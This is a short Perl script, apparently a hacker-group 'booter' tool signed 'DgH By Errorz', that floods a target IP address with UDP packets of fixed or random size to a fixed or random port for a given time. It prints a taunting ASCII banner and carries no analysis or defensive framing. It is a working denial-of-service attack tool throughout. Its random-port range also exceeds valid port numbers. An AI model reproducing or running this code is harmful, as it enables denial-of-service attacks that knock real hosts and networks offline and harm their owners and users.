#!/usr/bin/perl

##
# DgH By Errorz<----
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;


                d88888b d8888b. d8888b.  .d88b.  d8888b. d88888D 
                88'     88  `8D 88  `8D .8P  Y8. 88  `8D YP  d8' 
                88ooooo 88oobY' 88oobY' 88    88 88oobY'    d8'  
                88~~~~~ 88`8b   88`8b   88    88 88`8b     d8'   
                88.     88 `88. 88 `88. `8b  d8' 88 `88.  d8' db 
                Y88888P 88   YD 88   YD  `Y88P'  88   YD d88888P




 DgH By Errorz, Errorz Clapped Your Shit.
EOTEXT

print "::Get @ Me Random:: $ip " . ($port ? $port : "random") . " Disrespected = " .
  ($size ? "$size-byte" : "Disconnected :)") . " ~Errorz~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}